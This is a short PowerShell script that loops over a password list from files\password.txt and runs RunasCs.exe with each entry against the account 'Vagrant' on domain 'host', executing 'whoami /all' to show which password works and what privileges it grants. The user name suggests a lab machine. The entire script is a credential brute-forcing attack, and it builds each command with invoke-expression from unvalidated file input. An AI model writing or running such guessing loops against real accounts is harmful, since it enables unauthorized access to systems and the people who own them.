$user = "Vagrant"
$domain = "host"
$passwords = get-content -path "files\password.txt"
foreach ($password in $passwords) {
	$command = ".\files\RunasCs.exe $user $password -d $domain 'cmd /c whoami /all'"
	invoke-expression $command
}